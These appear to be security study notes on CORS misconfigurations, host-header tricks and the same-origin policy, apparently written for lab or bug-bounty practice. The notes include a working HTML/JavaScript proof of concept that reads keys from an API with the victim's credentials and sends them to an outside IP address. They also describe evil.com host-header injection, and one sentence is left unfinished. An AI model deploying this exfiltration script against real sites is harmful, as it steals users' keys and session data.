- Cross origin resource sharing
- This can used to retrieve data from API/websites which shouldn't be able to access the legit website.
- Meaning an attacker might be able to show some data with some evil stuff on/from the legit website.

## What is SOP?

Same origin policy prevents:

- JavaScript on Site A from reading the cookies of Site B.
- JavaScript on Site A from reading the content of Site B.

The browser will send a request with an Origin header and the server can decide whether or not it should allow this request. The server can allow the browser to make CORS request by responding with the header **Access-Control-Allow-Origin:** and a list of hostnames. By default, the browser will send unauthenticated requests unless the server told it not to using **Access-Control-Allow-Credentials: true**.

But the vulnerability arises when server respond with **Access-Control-Allow-Origin: ***

- Sometime what happens that websites return the `origin` header as the `Access-Control-Allow-Origin`, because simplicity developer had decided to not maintain any white list.

## Exploitation

So test with the headers and see if you can get the server to display your `[https://evil.com](https://evil.com)` in the `Access-Control-Allow-Origin` header.

```html
<html>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://api-ptl-ad42da05-c93d6931.libcurl.so//api/v1/keys", false);
            xhr.withCredentials = true;
            xhr.send();

            var a=xhr.responseText;

            var xhr2 = new XMLHttpRequest();
            xhr2.open("GET", "http://52.66.120.246"+a,false);
            xhr2.withCredentials=true;
            xhr2.send();
        </script>
    </body>
</html>
```

This is the example in which we 

## Resources

- [https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
- [https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
- [https://github.com/trustedsec/cors-poc](https://github.com/trustedsec/cors-poc)
- [https://hackerone.com/reports/470298](https://hackerone.com/reports/470298)
- Try to use `[evil.com](http://evil.com)` in `HOST` header it is possible that the email ID you get would be containing URL with `evil.com`
    - Try to use multiple hosts like

    ```jsx
    HOST: legit.com
    HOST: evil.com
    ```
